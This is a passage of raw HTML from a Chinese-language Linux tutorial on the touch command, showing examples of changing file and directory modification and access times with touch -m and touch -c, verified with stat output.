class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi ~]# touch -m /mnt/nfsshare/\r\n[root@linuxtechi ~]# stat /mnt/nfsshare/\r\n  File: '/mnt/nfsshare/'\r\n  Size: 6               Blocks: 0          IO Block: 4096   directory\r\nDevice: fd00h/64768d    Inode: 2258        Links: 2\r\nAccess: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)\r\nContext: unconfined_u:object_r:mnt_t:s0\r\nAccess: 2018-03-29 23:34:38.095000000 -0400\r\nModify: 2018-03-03 10:42:45.194000000 -0500\r\nChange: 2018-03-29 23:34:38.095000000 -0400\r\n Birth: -\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d07084173790-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d07084173790-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d07084173790-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d07084173790-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d07084173790-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d07084173790-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d07084173790-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d07084173790-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d07084173790-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d07084173790-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d07084173790-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d07084173790-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106d07084173790-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># touch -m /mnt/nfsshare/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d07084173790-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># stat /mnt/nfsshare/</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d07084173790-3\"> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">File</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'/mnt/nfsshare/'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d07084173790-4\"> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Size</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span>              <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Blocks</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span>         <span class=\"crayon-h\"> </span><span class=\"crayon-e\">IO </span><span class=\"crayon-v\">Block</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4096</span>  <span class=\"crayon-h\"> </span><span class=\"crayon-e\">directory</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d07084173790-5\"><span class=\"crayon-v\">Device</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fd00h</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">64768d</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Inode</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2258</span>       <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Links</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d07084173790-6\"><span class=\"crayon-v\">Access</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0755</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">drwxr</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">xr</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Uid</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">/</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">)</span>  <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Gid</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">/</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d07084173790-7\"><span class=\"crayon-v\">Context</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">unconfined_u</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">object_r</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">mnt_t</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">s0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d07084173790-8\"><span class=\"crayon-v\">Access</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">29</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">23</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">34</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">38.095000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0400</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d07084173790-9\"><span class=\"crayon-v\">Modify</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">45.194000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0500</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d07084173790-10\"><span class=\"crayon-v\">Change</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">29</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">23</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">34</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">38.095000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0400</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d07084173790-11\"> <span class=\"crayon-v\">Birth</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d07084173790-12\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0032 seconds] -->\r\n<p></p>\n<h3 id=\"toc_4\">示例：4 更改访问时间而不用创建新文件</h3>\n<p>在某些情况下，如果文件存在，我们希望更改文件的访问时间，并避免创建文件。在 touch 命令中使用 <code>-c</code> 选项即可，如果文件存在，那么我们可以改变文件的访问时间，如果不存在，我们也可不会创建它。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106d0b507602557\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi ~]# touch -c sysadm-20.txt\r\n[root@linuxtechi ~]# touch -c winadm-20.txt\r\n[root@linuxtechi ~]# ls -l winadm-20.txt\r\nls: cannot access winadm-20.txt: No such file or directory\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d0b507602557-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d0b507602557-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d0b507602557-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d0b507602557-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d0b507602557-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106d0b507602557-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># touch -c sysadm-20.txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d0b507602557-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># touch -c winadm-20.txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d0b507602557-3\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ls -l winadm-20.txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d0b507602557-4\"><span class=\"crayon-v\">ls</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cannot </span><span class=\"crayon-e\">access </span><span class=\"crayon-v\">winadm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">20.txt</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">No </span><span class=\"crayon-e\">such </span><span class=\"crayon-e\">file </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">directory</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d0b507602557-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p></p>\n<h3 id=\"toc_5\">示例：5 更改文件和目录的修改时间</h3>\n<p>在 <code>touch</code> 命令中使用 <code>-m</code> 选项，我们可以更改文件和目录的修改时间。</p>\n<p>让我们更改名为 <code>devops.txt</code> 文件的更改时间：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106d11392098996\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi ~]# touch -m devops.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d11392098996-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d11392098996-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106d11392098996-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># touch -m devops.txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d11392098996-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>现在使用 <code>stat</code> 命令来验证修改时间是否改变：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106d15620527928\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@linuxtechi ~]# stat devops.txt\r\n  File: 'devops.txt'\r\n  Size: 0               Blocks: 0          IO Block: 4096   regular empty file\r\nDevice: fd00h/64768d    Inode: 67324178    Links: 1\r\nAccess: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)\r\nContext: unconfined_u:object_r:admin_home_t:s0\r\nAccess: 2018-03-29 23:03:10.902000000 -0400\r\nModify: 2018-03-29 23:59:49.106000000 -0400\r\nChange: 2018-03-29 23:59:49.106000000 -0400\r\n Birth: -\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d15620527928-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d15620527928-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d15620527928-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d15620527928-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d15620527928-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d15620527928-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d15620527928-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d15620527928-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d15620527928-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93106d15620527928-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93106d15620527928-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93106d15620527928-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">linuxtechi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># stat devops.txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d15620527928-2\"> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">File</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'devops.txt'</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d15620527928-3\"> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Size</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span>              <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Blocks</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span>         <span class=\"crayon-h\"> </span><span class=\"crayon-e\">IO </span><span class=\"crayon-v\">Block</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4096</span>  <span class=\"crayon-h\"> </span><span class=\"crayon-e\">regular </span><span class=\"crayon-e\">empty </span><span class=\"crayon-e\">file</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d15620527928-4\"><span class=\"crayon-v\">Device</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fd00h</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">64768d</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Inode</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">67324178</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Links</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d15620527928-5\"><span class=\"crayon-v\">Access</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0644</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Uid</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">/</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">)</span>  <span class=\"crayon-h\"> </span><span class=\"crayon-v\">Gid</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">/</span>   <span class=\"crayon-h\"> </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d15620527928-6\"><span class=\"crayon-v\">Context</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">unconfined_u</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">object_r</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">admin_home_t</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">s0</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d15620527928-7\"><span class=\"crayon-v\">Access</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">29</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">23</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">10.902000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0400</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d15620527928-8\"><span class=\"crayon-v\">Modify</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">29</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">23</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">59</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">49.106000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0400</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d15620527928-9\"><span class=\"crayon-v\">Change</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">03</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">29</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">23</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">59</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">49.106000000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0400</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93106d15620527928-10\"> <span class=\"crayon-v\">Birth</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93106d15620527928-11\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0033 seconds] -->\r\n<p>同样的，我们可以改变一个目录的修改时间：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93106d18402681496\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div 